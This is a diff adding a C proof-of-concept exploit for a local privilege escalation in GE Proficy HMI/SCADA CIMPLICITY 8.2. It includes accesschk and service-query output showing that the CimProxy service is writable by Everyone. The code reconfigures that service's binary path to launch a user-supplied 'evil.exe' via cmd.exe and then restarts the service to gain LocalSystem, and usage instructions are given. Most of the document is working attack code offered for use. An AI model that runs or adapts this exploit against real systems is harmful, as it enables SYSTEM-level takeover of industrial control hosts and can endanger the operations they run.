@@ -1,0 +1,59 @@
+/*
+# Exploit Title: GE Proficy HMI/SCADA CIMPLICITY 8.2 Local Privilege Escalation Exploit(0 day)
+# Vulnerability Discovery and Exploit Author: Zhou Yu
+# Email: <504137480@qq.com>
+# Version: 8.2
+# Tested on: Windows 7 SP1 X32
+# CVE : None
+
+Vulnerability Description:
+SERVICE_CHANGE_CONFIG Privilege Escalation
+C:\Users\lenovo\Desktop\AccessChk>accesschk.exe -q -v -c CimProxy
+CimProxy
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW Everyone
+        SERVICE_ALL_ACCESS
+
+C:\Users\lenovo\Desktop\AccessChk>sc qc CimProxy
+[SC] QueryServiceConfig �ɹ�
+
+SERVICE_NAME: CimProxy
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Proficy\Proficy CIMPLICITY\exe\Cim
+Proxy.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : CIMPLICITY Proxy Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+Usage:
+Put evil.exe and the exploit in the same folder and then run the exploit.
+*/
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+void main()
+{
+	char szPath[MAX_PATH];
+	char *t;
+    GetModuleFileName(NULL,szPath,MAX_PATH);
+	t = strrchr(szPath, 0x5C);
+	t[0] = '\\';
+	t[1] = '\0';
+	strcat(szPath,"evil.exe\"");
+	char t1[] = "\"cmd.exe /c ";
+	char payload[] = "sc config CimProxy binPath= ";
+	strcat(t1,szPath);
+	strcat(payload,t1);
+ 
+	system(payload);
+	//stop service
+	printf("stop service!\n");
+	system("net stop CimProxy");
+	//start service
+	printf("start service!\n");
+	system("net start CimProxy");
+	
+}
